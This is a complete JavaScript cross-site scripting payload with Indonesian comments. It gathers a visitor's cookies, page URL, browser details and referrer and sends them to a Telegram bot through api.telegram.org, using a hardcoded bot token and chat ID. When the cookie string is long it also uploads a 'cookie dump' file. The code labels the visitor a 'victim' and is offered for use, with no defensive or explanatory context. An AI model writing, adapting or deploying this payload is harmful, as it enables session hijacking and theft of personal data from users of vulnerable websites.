<script>
(function() {
    // ========== KONFIGURASI TELEGRAM ==========
    const BOT_TOKEN = '8986955752:AAFWP6MKM4vG7cxxOZ6hsQG_sXfrg7EyQa8';     // Ganti dengan token bot kamu
    const CHAT_ID = '6688114602';         // Ganti dengan chat ID kamu
    
    // ========== KUMPULKAN DATA ==========
    const data = {
        // Info dari URL
        url: window.location.href,
        origin: window.location.origin,
        path: window.location.pathname,
        
        // Cookie (yang bukan HttpOnly)
        cookies: document.cookie || '(Tidak ada cookie)',
        
        // Info browser/korban
        user_agent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        
        // Info waktu
        timestamp: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
        
        // Screen resolution
        screen: `${screen.width}x${screen.height}`,
        
        // Referer (darimana datangnya)
        referer: document.referrer || '(Langsung)'
    };
    
    // ========== FORMAT PESAN RAPI ==========
    const pesan = `
🛡️ *XSS DETECTED* 🛡️

*📅 Waktu:* ${data.timestamp}
*🌐 URL:* ${data.url}
*📁 Path:* ${data.path}
*🔗 Origin:* ${data.origin}

*🍪 COOKIES:*
\`\`\`
${data.cookies}
\`\`\`

*💻 VICTIM INFO:*
• *User Agent:* ${data.user_agent}
• *Platform:* ${data.platform}
• *Language:* ${data.language}
• *Screen:* ${data.screen}
• *Referer:* ${data.referer}

*🎯 Target:* ${data.origin}
    `.trim();
    
    // ========== KIRIM KE TELEGRAM ==========
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: pesan,
            parse_mode: 'Markdown'
        })
    })
    .then(() => console.log('[✓] Data terkirim ke Telegram'))
    .catch(e => console.error('[✗] Gagal kirim:', e));
    
    // Optional: Kirim cookie juga sebagai file (jika cookie panjang)
    if (data.cookies.length > 200) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                document: `data:text/plain,${encodeURIComponent(JSON.stringify(data, null, 2))}`,
                filename: `cookies_${Date.now()}.txt`,
                caption: `📁 Cookie dump dari ${data.origin}`
            })
        }).catch(e => console.log('File not sent'));
    }
})();
</script>
